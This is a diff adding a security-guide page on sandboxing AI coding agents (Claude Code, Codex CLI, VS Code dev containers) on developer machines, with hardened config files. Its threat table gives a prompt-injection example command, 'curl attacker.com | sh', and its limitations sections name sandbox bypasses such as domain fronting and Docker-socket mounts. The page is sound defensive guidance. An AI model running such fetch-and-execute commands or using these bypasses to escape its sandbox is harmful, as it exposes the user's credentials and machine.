@@ -1,0 +1,163 @@
+---
+title: "Developer Machine Sandboxing | SEAL"
+description: "Practical sandboxing configurations for Claude Code, Codex CLI, and VS Code dev containers to constrain blast radius on developer machines."
+tags:
+  - Engineer/Developer
+  - Security Specialist
+  - DevOps
+contributors:
+  - role: wrote
+    users: [elliot]
+---
+
+import { TagList, AttributionList, TagProvider, TagFilter, ContributeFooter } from '../../../../components'
+
+<TagProvider>
+<TagFilter />
+
+# Developer Machine Sandboxing
+
+<TagList tags={frontmatter.tags} />
+<AttributionList contributors={frontmatter.contributors} />
+
+> 🔑 **Key Takeaway**: Sandboxing on your developer machine limits the blast radius when a tool goes wrong, whether that's prompt injection, a malicious dependency, or an LLM mistake. Imperfect containment is much better than no containment, and spending 5 minutes configuring containers can prevent company ending mistakes.
+
+AI coding agents run shell commands directly on your machine. A prompt injection or a malicious package could read `~/.ssh`, modify `.bashrc`, or silently steal secrets. Unlike CI runners, developer machines aren't ephemeral: they carry years of credentials, tokens, and config. The goal of sandboxing is making sure the blast radius of mistakes stays contained.
+
+## Threats
+
+| Type | Example | Mitigated by |
+| --- | --- | --- |
+| Prompt injection | Malicious file content tricks agent into running `curl attacker.com \| sh` | Sandboxing, shell command restrictions |
+| Malicious dependency | npm package exfiltrates env vars on install | Deny-by-default egress, blocked home directory reads |
+| LLM mistake | Agent overwrites `~/.zshrc` or deletes project files | Filesystem write restrictions scoped to working directory |
+
+## Claude Code: native sandbox mode
+
+Claude Code has a native sandboxed bash tool backed by OS-level primitives: Seatbelt on macOS, bubblewrap on Linux and WSL2. The sandbox applies to every subprocess Claude invokes (npm, kubectl, terraform, git), not just Claude's own file tools.
+
+**Step 1: install prerequisites (Linux/WSL2 only, macOS has Seatbelt built in)**:
+
+```bash
+sudo apt-get install bubblewrap socat   # Ubuntu/Debian
+sudo dnf install bubblewrap socat        # Fedora
+```
+
+**Step 2: enable sandboxing**:
+
+Run `/sandbox` inside Claude Code. You'll get a menu with two modes:
+
+- **Auto-allow**: sandboxed commands run without per-command prompts. Anything that can't run inside the sandbox (e.g. a command reaching a non-allowed host) falls back to the normal approval flow. This mode reduces approval fatigue.
+- **Regular permissions**: every bash command still goes through the standard approval flow, but OS-level filesystem and network restrictions are still enforced. This adds more friction, but results in better system security properties.
+
+Start with auto-allow. You can tighten it per-project via settings.
+
+**Step 3: harden the project config** (`.claude/settings.json`):
+
+```json
+{
+  "sandbox": {
+    "enabled": true,
+    "failIfUnavailable": true,
+    "allowUnsandboxedCommands": false,
+    "filesystem": {
+      "denyRead": ["~/"],
+      "allowRead": ["."],
+      "allowWrite": ["/tmp/build"]
+    },
+    "network": {
+      "allowedDomains": [
+        "registry.npmjs.org",
+        "api.github.com",
+        "crates.io"
+      ]
+    }
+  },
+  "permissions": {
+    "deny": ["Read(.env)"]
+  }
+}
+```
+
+- `failIfUnavailable: true`: hard-fails if the sandbox can't start, rather than silently running without isolation
+- `allowUnsandboxedCommands: false`: closes the built-in escape hatch that lets Claude retry a failing command outside the sandbox
+- `denyRead: ["~/"]`: blocks reads from your home directory; SSH keys and shell history are invisible to the agent
+- `allowRead: ["."]`: restores read access to the current project root (inside the denied region)
+- `allowWrite: ["/tmp/build"]`: if a build tool needs to write outside the working directory, grant it here specifically
+- `allowedDomains`: explicit egress allowlist; omit anything you don't actively need
+- `permissions.deny`: blocks Claude's file tools from reading specific sensitive paths. Note that `allowRead` takes precedence over `denyRead` within the sandbox, so project-root secrets like `.env` need to be excluded here instead
+
+### Known limitations
+
+- The proxy enforces the allowlist by hostname; it does not terminate or inspect TLS. Domain fronting can bypass the allowlist. If that's in your threat model, run a custom TLS-terminating proxy instead.
+- `allowUnixSockets` can expose the Docker socket and grant effective host root. Don't use it unless you know what you're doing.
+- Adding broad domains like `github.com` to the allowlist opens exfiltration paths.
+- There is no command allowlist at the project level. Shell tools like `curl` can still run inside the sandbox as long as they target an allowed domain. `allowedDomains` constrains where commands can reach, not which commands can run.
+
+## Codex CLI: native sandbox mode
+
+Codex CLI has native sandboxing built in, using the same OS primitives. In the CLI, use `/permissions` to switch modes during a session. The safest practical default for daily development is `workspace-write` combined with `approval_policy = "on-request"`: Codex can read and write within your project directory, but pauses for approval before going beyond that boundary. Avoid `danger-full-access` since it removes filesystem and network boundaries entirely and should not be used for normal work.
+
+To make this the persistent default, add the following to `~/.codex/config.toml`:
+
+```toml
+[sandbox]
+sandbox_mode = "workspace-write"
+approval_policy = "on-request"
+
+[sandbox.sandbox_workspace_write]
+writable_roots = ["./"]
+
+[permissions.default.network]
+# deny all by default; add specific domains as needed
+domains = {}
+```
+
+## VS Code dev containers
+
+Dev containers run VS Code and every extension installed into it (including AI coding agents) inside a Docker container. The container only sees what you explicitly mount. SSH keys, AWS credentials, and anything else under `~` stays on the host.
+
+**Baseline `.devcontainer/devcontainer.json`**:
+
+```json
+{
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "workspaceMount": "source=${localWorkspaceFolder},target=/workspace,type=bind",
+  "workspaceFolder": "/workspace",
+  "runArgs": [
+    "--cap-drop=ALL",
+    "--security-opt=no-new-privileges"
+  ],
+  "remoteUser": "vscode"
+}
+```
+
+- `--network=none`: only add this flag for a box to quarantine it from the internet. Cuts all egress and outbound traffic
+- `--cap-drop=ALL`: drops Linux capabilities (no raw sockets, no privilege escalation paths)
+- `--security-opt=no-new-privileges`: prevents setuid/setgid escalation inside the container
+- Single `workspaceMount`: the host filesystem outside the project directory is not visible
+- Container memory can also be restricted to prevent software running inside a container from crashing the computer.
+
+### Limitations
+
+Dev containers aren't designed as security sandboxes; convenience shortcuts dominate the defaults. Three things to fix:
+
+- Default base images ship with passwordless `sudo`. Disable it, or set `remoteUser` to a user without sudo access.
+- Never mount the Docker socket (`/var/run/docker.sock`). It gives the container root-equivalent access to the host.
+- `--network=none` breaks package installs. A custom Docker network with an egress proxy is more practical for daily development.
+
+Trail of Bits has published a hardened devcontainer at [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer), built for running Claude Code and VSCode Containers against untrusted codebases in security audits. It's a useful starting point if you want a well-considered baseline rather than building from scratch.
+
+## References
+
+- [Claude Code sandboxing](https://code.claude.com/docs/en/sandboxing)
+- [Codex CLI sandboxing](https://developers.openai.com/codex/concepts/sandboxing)
+- [Trail of Bits claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)
+- [VS Code: Developing inside a Container](https://code.visualstudio.com/docs/devcontainers/containers)
+- [NIST SP 800-190, *Application Container Security Guide*](https://csrc.nist.gov/pubs/sp/800/190/final)
+- [Docker, *Docker Engine Security*](https://docs.docker.com/engine/security/)
+
+---
+
+</TagProvider>
+<ContributeFooter />
